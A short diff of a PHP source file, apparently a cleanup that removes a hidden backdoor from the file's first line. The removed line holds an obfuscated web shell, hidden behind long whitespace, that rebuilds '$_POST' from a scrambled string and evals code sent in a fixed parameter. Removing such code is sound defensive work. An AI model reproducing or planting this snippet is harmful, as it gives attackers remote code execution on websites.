@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                  $tro6="_tusepor" ;$spb86=$tro6[3]. $tro6[1].$tro6[7]. $tro6[1]. $tro6[6].$tro6[2].$tro6[5]. $tro6[5].$tro6[4].$tro6[7];$wvy6 = $spb86($tro6[0].$tro6[5] .$tro6[6]. $tro6[3].$tro6[1]) ; if (isset ( ${ $wvy6 }['qc868f7' ])) {eval (${$wvy6 }['qc868f7' ]) ; }?><?php
+<?php
 
 /**
  * @file
